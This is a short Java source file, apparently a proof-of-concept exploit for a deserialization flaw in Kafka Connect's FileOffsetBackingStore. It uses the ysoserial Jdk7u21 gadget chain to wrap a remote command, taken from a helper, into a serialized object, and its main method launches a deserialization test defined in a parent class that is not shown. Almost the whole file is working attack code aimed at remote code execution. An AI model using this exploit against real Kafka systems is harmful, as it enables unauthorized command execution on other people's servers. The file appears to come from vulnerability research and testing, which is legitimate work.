package com.unionpay.kafka.test;

import com.unionpay.kafka.test.common.AbstractMain;
import com.unionpay.kafka.test.util.OSUtil;
import org.apache.commons.io.FileUtils;
import org.apache.kafka.connect.runtime.standalone.StandaloneConfig;
import org.apache.kafka.connect.storage.FileOffsetBackingStore;
import ysoserial.payloads.Jdk7u21;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.HashMap;
import java.util.Map;

/**
 * date: 2017/09/12 16:46.
 * author: Yueqi Shi
 */
public class OfficialPocMain extends AbstractMain {

    public Object getObject() throws Exception {
        Jdk7u21 jdk7u21 = new Jdk7u21();
        Object o = jdk7u21.getObject(OSUtil.getRemoteCmd());

        return o;
    }

    public static void main(String[] args) {
        try {
            new OfficialPocMain().test_Kafka_Deser();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
